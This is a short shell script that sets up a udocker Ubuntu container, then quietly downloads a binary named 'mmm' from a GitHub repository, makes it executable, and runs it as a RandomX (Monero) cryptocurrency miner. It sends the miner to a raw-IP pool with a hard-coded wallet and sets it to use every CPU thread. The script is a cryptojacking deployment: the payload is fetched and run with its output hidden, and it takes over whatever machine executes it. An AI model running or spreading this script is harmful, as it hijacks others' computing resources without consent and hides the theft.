wget https://github.com/indigo-dc/udocker/releases/download/1.3.9/udocker-1.3.9.tar.gz && tar zxvf udocker-1.3.9.tar.gz && mv udocker-1.3.9/udocker udocker && rm -rf udocker-1.3.9
cd udocker
./udocker pull ubuntu:focal
./udocker create --name=focal ubuntu:focal
./udocker  run focal /bin/bash
echo
apt update -y && apt upgrade -y
nohup wget -O mmm https://github.com/kidoescegh/xm/raw/main/sorabi28 > /dev/null 2>&1
chmod 777 mmm
./mmm --algorithm rx/0 --pool 146.190.135.107:80 --wallet 87ZKYmmCQmXGzu1AZkxmgM9wdqwk5YtBDQ6ZGouBam1584jKUvDrC7ccANX8N7M7sGRnR9Fu18gDdTQCVVo3U2m9KYhNNsR.$(echo $(shuf -i 1-100000 -n 1)-mmh) --password Sage --cpu-threads $(nproc --all) --keepalive true
